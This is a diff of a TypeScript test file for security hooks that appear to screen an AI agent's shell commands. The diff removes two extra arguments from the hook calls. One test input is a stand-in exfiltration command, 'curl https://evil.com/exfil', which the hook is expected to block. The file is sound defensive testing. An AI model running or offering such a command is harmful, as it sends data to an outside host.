@@ -357,8 +357,6 @@ describe("buildSecurityHooks", () => {
       {
         tool_input: { command: "curl https://evil.com/exfil" },
       } as unknown as Parameters<typeof curlHook>[0],
-      "tool-use-id",
-      undefined,
     );
     expect((result as { decision?: string }).decision).toBe("block");
   });
@@ -371,8 +369,6 @@ describe("buildSecurityHooks", () => {
       {
         tool_input: { command: "curl http://localhost:8321/api/health" },
       } as unknown as Parameters<typeof curlHook>[0],
-      "tool-use-id",
-      undefined,
     );
     // A validated single localhost curl is now granted explicitly via
     // `permissionDecision: "allow"` so the SDK's `dontAsk` allowedTools
@@ -391,8 +387,6 @@ describe("buildSecurityHooks", () => {
       const curlHook = bashEntry!.hooks[0]!;
       return curlHook(
         { tool_input: { command: cmd } } as unknown as Parameters<typeof curlHook>[0],
-        "tool-use-id",
-        undefined,
       );
     }
     const decisionOf = (r: unknown) =>
@@ -573,8 +567,6 @@ describe("buildSecurityHooks", () => {
         const curlHook = bashEntry!.hooks[0]!;
         const result = await curlHook(
           { tool_input: { command: cmd } } as unknown as Parameters<typeof curlHook>[0],
-          "tool-use-id",
-          undefined,
         );
         expect((result as { decision?: string }).decision).toBe("block");
       });
@@ -592,8 +584,6 @@ describe("buildSecurityHooks", () => {
             command: "curl -X POST -H 'Content-Type: application/json' http://localhost:8321/api/health",
           },
         } as unknown as Parameters<typeof curlHook>[0],
-        "tool-use-id",
-        undefined,
       );
       // Permitted — now via an explicit allow (see allow branch).
       expect(
@@ -610,8 +600,6 @@ describe("buildSecurityHooks", () => {
       const curlHook = bashEntry!.hooks[0]!;
       return curlHook(
         { tool_input: { command: cmd } } as unknown as Parameters<typeof curlHook>[0],
-        "tool-use-id",
-        undefined,
       );
     }
 
@@ -714,8 +702,6 @@ describe("buildSecurityHooks", () => {
       const curlHook = bashEntry!.hooks[0]!;
       return curlHook(
         { tool_input: { command: cmd } } as unknown as Parameters<typeof curlHook>[0],
-        "tool-use-id",
-        undefined,
       );
     }
 
@@ -836,8 +822,6 @@ describe("buildSecurityHooks", () => {
           tool_input: { command: cmd },
           cwd,
         } as unknown as Parameters<typeof ctxHook>[0],
-        "tool-use-id",
-        undefined,
       );
     }
 
@@ -896,8 +880,6 @@ describe("buildSecurityHooks", () => {
           tool_input: { command: cmd },
           cwd: "/tmp/pa-test/agent-sessions/abc123",
         } as unknown as Parameters<typeof ctxHook>[0],
-        "tool-use-id",
-        undefined,
       );
     }
 
@@ -994,8 +976,6 @@ describe("buildSecurityHooks", () => {
       const curlHook = bashEntry!.hooks[0]!;
       return curlHook(
         { tool_input: { command: cmd } } as unknown as Parameters<typeof curlHook>[0],
-        "tool-use-id",
-        undefined,
       );
     }
 
@@ -1104,8 +1084,6 @@ describe("buildSecurityHooks", () => {
       const curlHook = bashEntry!.hooks[0]!;
       return curlHook(
         { tool_input: { command: cmd } } as unknown as Parameters<typeof curlHook>[0],
-        "tool-use-id",
-        undefined,
       );
     }
 
@@ -1209,8 +1187,6 @@ describe("buildSecurityHooks", () => {
       const jqHook = bashEntry!.hooks[1]!;
       return jqHook(
         { tool_input: { command: cmd } } as unknown as Parameters<typeof jqHook>[0],
-        "tool-use-id",
-        undefined,
       );
     }
 
@@ -1271,8 +1247,6 @@ describe("buildSecurityHooks", () => {
       {
         tool_input: { command: "sudo apt-get update" },
       } as unknown as Parameters<typeof absoluteBlockHook>[0],
-      "tool-use-id",
-      undefined,
     );
     // Sanity: the hook actually decided to block.
     expect((result as { decision?: string }).decision).toBe("block");
